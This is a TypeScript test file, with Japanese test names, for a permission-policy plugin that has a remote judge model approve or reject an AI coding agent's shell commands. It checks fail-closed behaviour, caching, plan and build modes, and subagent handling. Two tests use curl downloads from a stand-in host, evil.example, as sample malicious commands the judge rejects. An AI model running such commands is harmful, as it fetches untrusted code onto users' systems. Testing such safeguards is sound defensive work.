import { describe, expect, test } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { JevPolicyPlugin } from "../plugins/jev_policy.ts";

type PluginInput = Parameters<typeof JevPolicyPlugin>[0];

type Captured = {
  replies: { permissionID: string; response: string }[];
  fetchCount: number;
  fetchBodies: { state: { prompt: string } }[];
  logs: string[];
};

const jevBody = (choice: string, confidence: number) =>
  JSON.stringify({
    answers: {
      judgment: {
        type: "choice",
        choice,
        confidence,
        probabilities: { allow: confidence, reject: 1 - confidence },
      },
    },
    usage: { input_tokens: 120, output_tokens: 4, cost: 0.0002 },
  });

type SessionRecord = { agent?: string; parentID?: string; directory?: string };

type MessageEntry = {
  info: { role: string };
  parts: { type: string; text: string }[];
};

const userEntry = (text: string): MessageEntry => ({
  info: { role: "user" },
  parts: [{ type: "text", text }],
});

const assistantEntry = (text: string): MessageEntry => ({
  info: { role: "assistant" },
  parts: [{ type: "text", text }],
});

const makeHarness = (options: {
  sessions: Record<string, SessionRecord>;
  responseBody: string;
  ok?: boolean;
  apiKey?: string | null;
}) => {
  const captured: Captured = {
    replies: [],
    fetchCount: 0,
    fetchBodies: [],
    logs: [],
  };
  const sessions = options.sessions;
  const messages: Record<string, MessageEntry[] | undefined> = {};

  const client = {
    session: {
      get: async ({ path }: { path: { id: string } }) => ({
        data: sessions[path.id],
      }),
      messages: async ({ path }: { path: { id: string } }) => ({
        data: messages[path.id],
      }),
    },
    app: {
      log: async (opts: { body: { message: string } }) => {
        captured.logs.push(opts.body.message);
      },
    },
    postSessionIdPermissionsPermissionId: async (opts: {
      path: { id: string; permissionID: string };
      body: { response: string };
    }) => {
      captured.replies.push({
        permissionID: opts.path.permissionID,
        response: opts.body.response,
      });
    },
  };

  const previousFetch = globalThis.fetch;
  const previousKey = process.env.OPENROUTER_API_KEY;
  const previousDataHome = process.env.XDG_DATA_HOME;
  globalThis.fetch = (async (_url: string, init: { body: string }) => {
    captured.fetchCount += 1;
    captured.fetchBodies.push(JSON.parse(init.body));
    return {
      ok: options.ok ?? true,
      status: options.ok === false ? 500 : 200,
      json: async () => JSON.parse(options.responseBody),
      text: async () => options.responseBody,
    };
  }) as unknown as typeof fetch;
  // auth.json フォールバックが本物のストアを読まないよう空のデータホームへ向ける
  process.env.XDG_DATA_HOME = mkdtempSync(`${tmpdir()}/jev-empty-`);
  if (options.apiKey === null) delete process.env.OPENROUTER_API_KEY;
  else process.env.OPENROUTER_API_KEY = options.apiKey ?? "test-key";

  const hooks = JevPolicyPlugin({
    client,
  } as unknown as PluginInput);

  const restore = () => {
    globalThis.fetch = previousFetch;
    if (previousKey === undefined) delete process.env.OPENROUTER_API_KEY;
    else process.env.OPENROUTER_API_KEY = previousKey;
    if (previousDataHome === undefined) delete process.env.XDG_DATA_HOME;
    else process.env.XDG_DATA_HOME = previousDataHome;
  };
  return { captured, sessions, messages, hooks, restore };
};

const askJevEvent = async (
  harness: ReturnType<typeof makeHarness>,
  command: string,
  permission = "bash",
  sessionID = "ses_1",
) => {
  const hook = await harness.hooks;
  await hook.event?.({
    event: {
      type: "permission.asked",
      properties: {
        id: "per_1",
        sessionID,
        permission,
        patterns: [command],
        metadata: { command },
        always: [],
      },
    },
  });
};

describe("JevPolicyPlugin", () => {
  describe("permission.askedイベントへのjev自動判定", () => {
    test("高confidence allow判定にはonceで自動承認する", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        await askJevEvent(h, "ffmpeg -i a.mp4 b.mp4");
        expect(h.captured.replies).toEqual([
          { permissionID: "per_1", response: "once" },
        ]);
      } finally {
        h.restore();
      }
    });

    test("高confidence reject判定にはrejectを自動返信する", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("reject", 0.9),
      });
      try {
        await askJevEvent(h, "curl http://evil.example/install.sh");
        expect(h.captured.replies).toEqual([
          { permissionID: "per_1", response: "reject" },
        ]);
      } finally {
        h.restore();
      }
    });

    test("低confidence判定にはfail-closedでrejectを返す", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("allow", 0.55),
      });
      try {
        await askJevEvent(h, "tar czf x.tar.gz .");
        expect(h.captured.replies).toEqual([
          { permissionID: "per_1", response: "reject" },
        ]);
      } finally {
        h.restore();
      }
    });

    test("jev通信失敗にもfail-closedでrejectを返す", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("allow", 0.95),
        ok: false,
      });
      try {
        await askJevEvent(h, "tar czf x.tar.gz .");
        expect(h.captured.replies).toEqual([
          { permissionID: "per_1", response: "reject" },
        ]);
      } finally {
        h.restore();
      }
    });

    test("同一コマンドの再判定はjevへ問い合わせない", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        await askJevEvent(h, "tar czf x.tar.gz .");
        await askJevEvent(h, "tar czf x.tar.gz .");
        expect(h.captured.fetchCount).toBe(1);
        expect(h.captured.replies).toHaveLength(2);
      } finally {
        h.restore();
      }
    });

    test("planとbuildでは同一コマンドでも別々に判定する", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        await askJevEvent(h, "cp a.txt b.txt");
        h.sessions.ses_1 = { agent: "plan" };
        await askJevEvent(h, "cp a.txt b.txt");
        expect(h.captured.fetchCount).toBe(2);
        const planPrompt = h.captured.fetchBodies[1].state.prompt;
        expect(planPrompt).toContain("現在のモード: plan");
        expect(planPrompt).toContain("厳格に読み取り専用");
      } finally {
        h.restore();
      }
    });

    test("直近ユーザーが変わると同一コマンドでも再判定する", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        h.messages.ses_1 = [userEntry("最初の依頼")];
        await askJevEvent(h, "tar czf x.tar.gz .");
        h.messages.ses_1 = [userEntry("別の依頼")];
        await askJevEvent(h, "tar czf x.tar.gz .");
        expect(h.captured.fetchCount).toBe(2);
        expect(h.captured.fetchBodies[1].state.prompt).toContain("別の依頼");
      } finally {
        h.restore();
      }
    });

    test("APIキーが未設定ならjevに問い合わせない", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("allow", 0.95),
        apiKey: null,
      });
      try {
        await askJevEvent(h, "tar czf x.tar.gz .");
        expect(h.captured.fetchCount).toBe(0);
        expect(h.captured.replies).toHaveLength(0);
      } finally {
        h.restore();
      }
    });

    test("bash以外の権限要求には反応しない", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        await askJevEvent(h, "some/file.txt", "edit");
        expect(h.captured.fetchCount).toBe(0);
      } finally {
        h.restore();
      }
    });

    test("permission.asked以外のイベントには反応しない", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        const hook = await h.hooks;
        await hook.event?.({
          event: { type: "session.idle", properties: {} },
        });
        expect(h.captured.fetchCount).toBe(0);
      } finally {
        h.restore();
      }
    });
  });

  describe("プロンプトへの文脈注入", () => {
    test("セッションのdirectoryをcwd事実として載せる", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build", directory: "/home/u/proj" } },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        await askJevEvent(h, "ls -la");
        expect(h.captured.fetchBodies[0].state.prompt).toContain(
          "cwd (ワークスペース): /home/u/proj",
        );
      } finally {
        h.restore();
      }
    });

    test("直近ユーザーメッセージをUNTRUSTED節に載せる", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        h.messages.ses_1 = [
          assistantEntry("古い応答"),
          userEntry("ログを整理して"),
        ];
        await askJevEvent(h, "rm ./tmplogs");
        const prompt = h.captured.fetchBodies[0].state.prompt;
        expect(prompt).toContain("UNTRUSTED CONTEXT");
        expect(prompt).toContain("ログを整理して");
        expect(prompt).not.toContain("古い応答");
      } finally {
        h.restore();
      }
    });

    test("スクリプト引数の中身をUNTRUSTED節に載せる", async () => {
      const dir = mkdtempSync(`${tmpdir()}/jev-script-`);
      const script = `${dir}/steps.sh`;
      const write = await import("node:fs");
      write.writeFileSync(script, "mkdir -p out\nls -la out\n");
      const h = makeHarness({
        sessions: { ses_1: { agent: "build", directory: dir } },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        await askJevEvent(h, `bash ${script}`);
        const prompt = h.captured.fetchBodies[0].state.prompt;
        expect(prompt).toContain(`--- ${script} ---`);
        expect(prompt).toContain("mkdir -p out");
      } finally {
        h.restore();
      }
    });

    test("存在しないスクリプト引数は検証不能事実としてFactsに載せる", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build", directory: "/home/u/proj" } },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        await askJevEvent(h, "bash /tmp/new/steps.sh");
        expect(h.captured.fetchBodies[0].state.prompt).toContain(
          "/tmp/new/steps.sh: 判定時点で存在しない",
        );
      } finally {
        h.restore();
      }
    });
  });

  describe("承認履歴とログ", () => {
    test("allow判定済みコマンドを同セッション後続判定のFactsに載せる", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        h.messages.ses_1 = [];
        await askJevEvent(h, "mkdir build");
        h.messages.ses_1 = [userEntry("次の依頼")];
        await askJevEvent(h, "tar czf x.tar.gz .");
        expect(h.captured.fetchBodies[1].state.prompt).toContain(
          "このセッションで直近に承認済み (過去の判定による): mkdir build",
        );
      } finally {
        h.restore();
      }
    });

    test("reject判定は履歴に載せない", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("reject", 0.95),
      });
      try {
        h.messages.ses_1 = [];
        await askJevEvent(h, "curl http://evil.example/x.sh");
        h.messages.ses_1 = [userEntry("次の依頼")];
        await askJevEvent(h, "tar czf x.tar.gz .");
        expect(h.captured.fetchBodies[1].state.prompt).not.toContain(
          "直近に承認済み",
        );
      } finally {
        h.restore();
      }
    });

    test("判定ログにsource・confidence・probabilitiesを残す", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        h.messages.ses_1 = [userEntry("依頼")];
        await askJevEvent(h, "ls -la");
        expect(h.captured.logs).toHaveLength(1);
        expect(h.captured.logs[0]).toContain("jev allow source=jev");
        expect(h.captured.logs[0]).toContain("confidence=0.950");
        expect(h.captured.logs[0]).toContain(
          'probabilities={"allow":0.95,"reject":0.050000000000000044}',
        );
      } finally {
        h.restore();
      }
    });

    test("fail-closedのログにはsource=fail-closedを残す", async () => {
      const h = makeHarness({
        sessions: { ses_1: { agent: "build" } },
        responseBody: jevBody("allow", 0.95),
        ok: false,
      });
      try {
        h.messages.ses_1 = [userEntry("依頼")];
        await askJevEvent(h, "ls -la");
        expect(h.captured.logs[0]).toContain("jev reject source=fail-closed");
      } finally {
        h.restore();
      }
    });
  });

  describe("サブエージェントは祖先セッションのモードで判定される", () => {
    test("planルートのgeneralサブエージェントはplanモードでjevに判定させる", async () => {
      const h = makeHarness({
        sessions: {
          ses_root: { agent: "plan" },
          ses_child: { agent: "general", parentID: "ses_root" },
        },
        responseBody: jevBody("reject", 0.95),
      });
      try {
        await askJevEvent(h, "cp a.txt b.txt", "bash", "ses_child");
        expect(h.captured.fetchBodies[0].state.prompt).toContain(
          "現在のモード: plan",
        );
      } finally {
        h.restore();
      }
    });

    test("buildルートのgeneralサブエージェントはbuildモードでjevに判定させる", async () => {
      const h = makeHarness({
        sessions: {
          ses_root: { agent: "build" },
          ses_child: { agent: "general", parentID: "ses_root" },
        },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        await askJevEvent(h, "python3 test_foo.py", "bash", "ses_child");
        expect(h.captured.fetchBodies[0].state.prompt).toContain(
          "現在のモード: build",
        );
      } finally {
        h.restore();
      }
    });

    test("explorerサブエージェントはplanモードでjevに判定させる", async () => {
      const h = makeHarness({
        sessions: {
          ses_root: { agent: "build" },
          ses_child: { agent: "explorer", parentID: "ses_root" },
        },
        responseBody: jevBody("reject", 0.95),
      });
      try {
        await askJevEvent(h, "python3 test_foo.py", "bash", "ses_child");
        expect(h.captured.fetchBodies[0].state.prompt).toContain(
          "現在のモード: plan",
        );
      } finally {
        h.restore();
      }
    });

    test("サブエージェントは祖先のdirectoryがないと直近のdirectoryを使う", async () => {
      const h = makeHarness({
        sessions: {
          ses_root: { agent: "build", directory: "/home/u/proj" },
          ses_child: { agent: "general", parentID: "ses_root" },
        },
        responseBody: jevBody("allow", 0.95),
      });
      try {
        await askJevEvent(h, "ls -la", "bash", "ses_child");
        expect(h.captured.fetchBodies[0].state.prompt).toContain(
          "cwd (ワークスペース): /home/u/proj",
        );
      } finally {
        h.restore();
      }
    });
  });
});
